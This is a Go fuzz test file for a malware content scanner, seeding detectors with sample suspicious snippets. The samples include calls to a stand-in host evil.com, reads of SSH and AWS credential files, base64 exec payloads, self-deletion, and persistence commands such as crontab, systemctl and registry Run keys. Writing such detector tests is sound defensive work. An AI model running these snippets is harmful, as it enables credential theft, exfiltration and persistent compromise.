package scanner

import (
	"strings"
	"testing"
)

// Fuzz tests for security-critical regex and parsing functions.
// Run with: go test -fuzz=FuzzDetectSuspiciousPatterns -fuzztime=30s ./internal/scanner/

func FuzzDetectSuspiciousPatterns(f *testing.F) {
	// Seed corpus with real-world patterns
	f.Add("eval(atob('bWFsaWNpb3Vz'))")
	f.Add("new Function('return ' + data)()")
	f.Add("setTimeout(function(){fetch('http://evil.com')}, 86400000)")
	f.Add(`var a = require('child_process').exec('curl evil.com')`)
	f.Add("normal javascript code without any suspicious patterns")
	f.Add("")
	f.Add(strings.Repeat("A", 10000)) // long string
	f.Add("\\x68\\x65\\x6c\\x6c\\x6f") // hex encoding
	f.Add("\\u0048\\u0065\\u006c\\u006c\\u006f") // unicode escape

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		// Should never panic
		_ = cs.detectSuspiciousPatterns(content)
	})
}

func FuzzDetectEmbeddedSecrets(f *testing.F) {
	f.Add("api_key = 'AKIAIOSFODNN7EXAMPLE1234'")
	f.Add("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh")
	f.Add("-----BEGIN RSA PRIVATE KEY-----")
	f.Add("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature")
	f.Add("password: supersecretpassword123")
	f.Add("normal code with no secrets")
	f.Add("")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectEmbeddedSecrets(content)
	})
}

func FuzzDetectNetworkIndicators(f *testing.F) {
	f.Add("https://evil.com/steal")
	f.Add("http://192.168.1.1/api")
	f.Add("fetch('https://registry.npmjs.org/lodash')")
	f.Add("curl http://10.0.0.1:8080/data")
	f.Add("https://checkmarx.zone/collect")
	f.Add("")
	f.Add(strings.Repeat("https://a.com ", 100))

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectNetworkIndicators(content)
	})
}

func FuzzDetectCustomCiphers(f *testing.F) {
	f.Add("String.fromCharCode(data.charCodeAt(i) ^ key)")
	f.Add("chr(ord(c) ^ 0x42)")
	f.Add("bytes([b ^ key for b in data])")
	f.Add("function _decode_payload(data) { return atob(data); }")
	f.Add("normal code")
	f.Add("")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectCustomCiphers(content)
	})
}

func FuzzDetectCredentialHarvesting(f *testing.F) {
	f.Add(`open(os.path.expanduser("~/.ssh/id_rsa")).read()`)
	f.Add(`fs.readFileSync(homedir + '/.aws/credentials')`)
	f.Add("normal code without credential access")
	f.Add("")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectCredentialHarvesting(content)
	})
}

func FuzzDetectCompoundBehaviors(f *testing.F) {
	f.Add("exec(base64.b64decode(payload))")
	f.Add("eval(fetch('https://evil.com').text())")
	f.Add(`fs.writeFileSync('/tmp/a', data); require('child_process').exec('chmod +x /tmp/a')`)
	f.Add("console.log('hello world')")
	f.Add("")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectCompoundBehaviors(content)
	})
}

func FuzzDetectPythonAutoExec(f *testing.F) {
	f.Add("test.pth", "import malware; malware.run()")
	f.Add("test.pth", "/usr/lib/python3/dist-packages")
	f.Add("sitecustomize.py", "import subprocess; subprocess.call(['curl', 'evil.com'])")
	f.Add("normal.py", "import os")
	f.Add("test.pth", "")
	f.Add("", "")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, filePath, content string) {
		_ = cs.detectPythonAutoExec(filePath, content)
	})
}

func FuzzDetectAntiForensics(f *testing.F) {
	f.Add("fs.unlinkSync(__filename)")
	f.Add("os.remove(__file__)")
	f.Add(`rm -f "$0"`)
	f.Add("writeFileSync('package.json', cleanData)")
	f.Add("normal code")
	f.Add("")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectAntiForensics(content)
	})
}

func FuzzDetectOSPersistence(f *testing.F) {
	f.Add("systemctl enable --now malware.service")
	f.Add("crontab -e")
	f.Add(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"`)
	f.Add("launchctl load ~/Library/LaunchAgents/com.evil.plist")
	f.Add("normal code")
	f.Add("")

	cs := NewContentScanner()
	f.Fuzz(func(t *testing.T, content string) {
		_ = cs.detectOSPersistence(content)
	})
}
